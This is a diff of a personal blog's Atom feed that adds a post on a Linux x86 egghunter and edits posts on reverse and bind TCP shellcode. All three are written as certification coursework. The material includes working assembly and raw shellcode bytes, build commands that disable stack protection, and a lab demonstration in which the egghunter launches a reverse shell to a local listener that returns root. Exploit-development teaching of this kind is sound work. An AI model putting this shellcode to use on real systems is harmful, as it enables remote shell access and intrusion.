@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2018-05-26T08:49:32+00:00</updated>
+  <updated>2018-07-12T20:51:38+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -14,11 +14,232 @@
 
   
   <entry>
+    <title type="html"><![CDATA[SLAE 0x03: Egghunter]]></title>
+    <link href="http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter/"/>
+    <updated>2018-06-19T23:56:39+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter</id>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This exercise consisted in using the egghunter technique, which is rather useful when a shellcode is bigger than the available space. On those circumstances, an egg can be planted right before the second stage shellcode which when found by the hunter will be executed.</p>
+
+<p>There is an interesting resource by <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape</a> which explains this concept quite well, as well as, various Linux implementations.</p>
+
+<p>The one I came up with is based on his revisited <a href="http://man7.org/linux/man-pages/man2/access.2.html">access(2)</a> system call with some differences. I&rsquo;ve decided to instead use the <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call and to start on the very first page of the process virtual address space. Even though Linux reserves the first few pages for performance reasons and prevents a process of allocating them to avoid potential security issues related to NULL pointer dereferences on page zero, not starting the search at 0x10000 (see <a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt">vm.mmap_min_addr</a>) allows shaving off a few bytes.</p>
+
+<p>The <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call will check if the provided address is valid. If for any reason the address can&rsquo;t be accessed (unmapped, invalid permissions, etc), then EFAULT (-14) is returned, which the egghunter should check for robustness. In that case, the next page (PAGE_SIZE) is tried until addressable memory is found.</p>
+
+<pre><code class="bash retrieving the error code">$ asm-errno EFAULT
+14
+0xfffffffffffffff2
+</code></pre>
+
+<pre><code class="c rmdir(2) prototype">int rmdir(const char *pathname);
+</code></pre>
+
+<pre><code class="bash retrieving the system call number and size of page">$ asm-syscall rmdir
+#define __NR_rmdir 40
+0x28
+$ getconf PAGE_SIZE
+4096
+</code></pre>
+
+<pre><code>+----------+--------------------+
+| register |       value        |
++----------+--------------------+
+| eax      | 40                 |
+| ebx      | address to search  |
++----------+--------------------+
+</code></pre>
+
+<p>To avoid repeating the egg twice and save space, the non-executable egg is also calculated on the fly by incrementing its value.</p>
+
+<p>String comparison is done with the scas family, which depending on the direction flag (DF) being set or not it automatically increments or decrements the pointer to the next character. To illustrate this, consider the following program where a string is printed to the screen character by character. This is using the <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the string to print:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+direction_print:
+    pushad
+
+    mov al, 0x4
+    ; ssize_t write(int, const void *, size_t)
+    mov bl, 0x1             ; fd
+    lea ecx, [esp + 0x1c]   ; buf
+    mov dl, 0x1             ; count
+    int 0x80
+
+    popad
+    ret
+
+_start:
+    cld                     ; clear direction flag
+
+    fldz                    ; retrieve the string address via fstenv
+    jmp direction_pc
+
+    ; the string is 4 bytes below of fdlz
+    str: db "this is a string", 0xa
+
+direction_loop:
+    lodsb
+    call direction_print
+    loop direction_loop
+
+    mov al, 0x1
+    ; void exit(int)
+    int 0x80
+
+direction_pc:
+    ; the FPU structure in memory contains the address of the last FPU
+    ; instruction on byte 0xc (the previous 3 bytes are composed of the
+    ; control, status and tag word)
+    fstenv [esp - 0xc]
+    pop ecx
+
+    lea esi, [ecx + 0x4]    ; string is 4 bytes below
+    push 0x11               ; string length
+    pop ecx
+
+    jmp direction_loop
+</code></pre>
+
+<pre><code class="bash">$ asm-compile direction-off.asm
+$ asm-opcodes direction-off
+Shellcode size: 63
+\x60\xb0\x04\xb3\x01\x8d\x4c\x24\x1c\xb2\x01\xcd\x80\x61\xc3\xfc\xd9\xee\xeb\x1d\x74\x68\x69\x73\x20\x69\x73\x20\x61\x20\x73\x74\x72\x69\x6e\x67\x0a\xac\xe8\xd5\xff\xff\xff\xe2\xf8\xb0\x01\xcd\x80\x9b\xd9\x74\x24\xf4\x59\x8d\x71\x04\x6a\x11\x59\xeb\xe6
+$ ./direction-off
+this is a string
+</code></pre>
+
+<p>Below, the direction flag (DF) is being set, resulting in the string being printed backwards as expected:</p>
+
+<pre><code class="diff">$ diff -u direction-off.asm direction-on.asm
+--- direction-off.asm   2018-06-24 17:20:35.044465700 +0100
++++ direction-on.asm    2018-06-24 18:54:48.168812600 +0100
+@@ -15,7 +15,7 @@
+        ret
+
+ _start:
+-       cld                     ; clear direction flag
++       std                     ; set direction flag
+
+        fldz                    ; retrieve the string address via fstenv
+        jmp direction_pc
+@@ -39,7 +39,7 @@
+        fstenv [esp - 0xc]
+        pop ecx
+
+-       lea esi, [ecx + 0x4]    ; string is 4 bytes below
++       lea esi, [ecx + 0x4 + 0x11 - 1] ; string is 4 bytes below
+        push 0x11               ; string length
+        pop ecx
+</code></pre>
+
+<pre><code class="bash">$ asm-compile direction-on.asm
+$ ./direction-on
+
+gnirts a si siht$
+</code></pre>
+
+<p>Given all of the above, the resulting egghunter shellcode is:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    cld                     ; clear direction flag for scasd
+    xor ebx, ebx
+
+egg_restart:
+    push 0x28
+    ; int rmdir(const char *)
+    pop eax
+    ; increment ebx to either align a page or check the next address
+    inc ebx                 ; pathname
+    int 0x80
+
+    cmp al, 0xf2            ; check for a page fault on the lower bits only
+    jnz egg_check           ; it's a valid page
+
+    or bx, 0xfff            ; not an addressable page
+    jmp egg_restart         ; check the next page (0xfff + 1 = PAGE_SIZE)
+
+egg_check:
+    mov eax, 0xcafebabd     ; add initial not static egg value
+    inc eax                 ; increment the value to decrease the size
+    mov edi, ebx            ; compare eax with edi
+    scasd                   ; edi is incremented since the direction flag is zero
+    jnz egg_restart         ; egg not found, try the next address
+
+    jmp edi                 ; edi points to the shellcode to execute
+</code></pre>
+
+<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>
+
+<pre><code class="bash">$ ./configure
+Using listening port: 0x9210
+Using remote host: 0x0101017f
+Using remote port: 0x9210
+$ cd 0x03-egghunter/
+$ STAGE2=../0x02-reverse/reverse make
+nasm  -f elf32 -o egghunter.o egghunter.asm
+ld -N -zexecstack -o egghunter egghunter.o
+08048060 &lt;_start&gt;:
+ 8048060:       fc                      cld
+ 8048061:       31 db                   xor    ebx,ebx
+
+08048063 &lt;egg_restart&gt;:
+ 8048063:       6a 28                   push   0x28
+ 8048065:       58                      pop    eax
+ 8048066:       43                      inc    ebx
+ 8048067:       cd 80                   int    0x80
+ 8048069:       3c f2                   cmp    al,0xf2
+ 804806b:       75 07                   jne    8048074 &lt;egg_check&gt;
+ 804806d:       66 81 cb ff 0f          or     bx,0xfff
+ 8048072:       eb ef                   jmp    8048063 &lt;egg_restart&gt;
+
+08048074 &lt;egg_check&gt;:
+ 8048074:       b8 bd ba fe ca          mov    eax,0xcafebabd
+ 8048079:       40                      inc    eax
+ 804807a:       89 df                   mov    edi,ebx
+ 804807c:       af                      scas   eax,DWORD PTR es:[edi]
+ 804807d:       75 e4                   jne    8048063 &lt;egg_restart&gt;
+ 804807f:       ff e7                   jmp    edi
+Shellcode size: 33
+\xfc\x31\xdb\x6a\x28\x58\x43\xcd\x80\x3c\xf2\x75\x07\x66\x81\xcb\xff\x0f\xeb\xef\xb8\xbd\xba\xfe\xca\x40\x89\xdf\xaf\x75\xe4\xff\xe7
+cc -DEGGHUNTER=`asm-opcodes egghunter` -DSHELLCODE=`asm-opcodes ../0x02-reverse/reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
+</code></pre>
+
+<pre><code class="bash">$ nc -lv 127.1.1.1 4242
+Listening on [127.1.1.1] (family 0, port 4242)
+Connection from localhost 51918 received!
+id
+uid=0(root) gid=0(root) groups=0(root)
+# ./shellcode
+Egghunter length: 33
+Shellcode length: 74
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[SLAE 0x02: Reverse TCP Shell]]></title>
     <link href="http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell/"/>
     <updated>2018-05-21T20:39:57+00:00</updated>
     <id>http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell</id>
-    <content type="html"><![CDATA[<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
 
 <pre><code class="c connect(2) prototype">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 </code></pre>
@@ -236,7 +457,7 @@ Using remote port: 0x9210
 $ cd 0x02-reverse/
 $ make
 nasm  -f elf32 -o reverse.o reverse.asm
-ld  -o reverse reverse.o
+ld -N -zexecstack -o reverse reverse.o
 08048060 &lt;_start&gt;:
  8048060:       31 c0                   xor    eax,eax
  8048062:       99                      cdq
@@ -275,6 +496,7 @@ ld  -o reverse reverse.o
  80480a4:       cd 80                   int    0x80
 Shellcode size: 70
 \x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x6a\x01\x68\x7f\x01\x01\x01\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x99\x50\x6a\x0b\x58\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
+cc -DSHELLCODE=`asm-opcodes reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
 </code></pre>
 
 <pre><code class="bash">$ nc -lv 127.1.1.1 4242
@@ -298,13 +520,6 @@ dup2(3, 1)                              = 1
 dup2(3, 0)                              = 0
 execve("//bin/sh", NULL, NULL)          = 0
 </code></pre>
-
-<p>This blog post has been created for completing the requirements of the
-SecurityTube Linux Assembly Expert certification:</p>
-
-<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
-
-<p>Student-ID: SLAE-1154</p>
 ]]></content>
   </entry>
   
@@ -313,7 +528,14 @@ SecurityTube Linux Assembly Expert certification:</p>
     <link href="http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell/"/>
     <updated>2018-05-20T21:51:39+00:00</updated>
     <id>http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell</id>
-    <content type="html"><![CDATA[<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
 
 <p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>
 
@@ -817,7 +1039,7 @@ Using remote port: 0x9210
 $ cd 0x01-bind/
 $ make
 nasm  -f elf32 -o bind.o bind.asm
-ld  -o bind bind.o
+ld -N -zexecstack -o bind bind.o
 08048060 &lt;_start&gt;:
  8048060:       31 c0                   xor    eax,eax
  8048062:       31 f6                   xor    esi,esi
@@ -862,6 +1084,7 @@ ld  -o bind bind.o
  80480b0:       cd 80                   int    0x80
 Shellcode size: 82
 \x31\xc0\x31\xf6\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
+cc -DSHELLCODE=`asm-opcodes bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
 </code></pre>
 
 <pre><code class="bash"># ./shellcode
@@ -934,13 +1157,6 @@ Shellcode size: 98
 66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x56\x68\x6e
 \x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
 </code></pre>
-
-<p>This blog post has been created for completing the requirements of the
-SecurityTube Linux Assembly Expert certification:</p>
-
-<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
-
-<p>Student-ID: SLAE-1154</p>
 ]]></content>
   </entry>
   
